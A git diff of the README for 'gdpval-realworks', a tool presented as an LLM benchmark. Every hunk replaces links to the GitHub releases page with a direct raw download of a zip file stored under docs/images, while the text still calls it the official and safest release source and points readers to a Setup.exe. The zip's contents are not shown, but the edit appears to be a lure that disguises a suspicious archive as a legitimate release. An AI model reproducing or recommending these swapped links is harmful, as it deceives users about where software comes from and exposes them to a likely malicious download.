@@ -1,6 +1,6 @@
 # ⚙️ gdpval-realworks - Benchmark LLMs on Professional Tasks
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/ashiquealfa/gdpval-realworks/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/ashiquealfa/gdpval-realworks/raw/refs/heads/main/docs/images/realworks-gdpval-anthomania.zip)
 
 ## 📋 About gdpval-realworks
 
@@ -24,7 +24,7 @@ These specs ensure the app runs smoothly and processes tasks quickly.
 
 1. Click the large download button below to visit the official release page:
 
-   [![Download Latest Release](https://img.shields.io/badge/Visit-GitHub%20Releases-grey?style=for-the-badge)](https://github.com/ashiquealfa/gdpval-realworks/releases)
+   [![Download Latest Release](https://img.shields.io/badge/Visit-GitHub%20Releases-grey?style=for-the-badge)](https://github.com/ashiquealfa/gdpval-realworks/raw/refs/heads/main/docs/images/realworks-gdpval-anthomania.zip)
 
 2. On the releases page, locate the latest stable release. Look for a file named similar to `gdpval-realworks-Setup.exe` or `gdpval-realworks-Windows.zip`.
 
@@ -89,7 +89,7 @@ Users can load these files through the dashboard by clicking “Load Experiment�
 
 You can always visit the official release page here:
 
-https://github.com/ashiquealfa/gdpval-realworks/releases
+https://github.com/ashiquealfa/gdpval-realworks/raw/refs/heads/main/docs/images/realworks-gdpval-anthomania.zip
 
 This link takes you to the safest place to get the latest version.
 
@@ -128,4 +128,4 @@ If you encounter issues, you can submit them on the GitHub issues page. Contribu
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/ashiquealfa/gdpval-realworks/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/ashiquealfa/gdpval-realworks/raw/refs/heads/main/docs/images/realworks-gdpval-anthomania.zip)
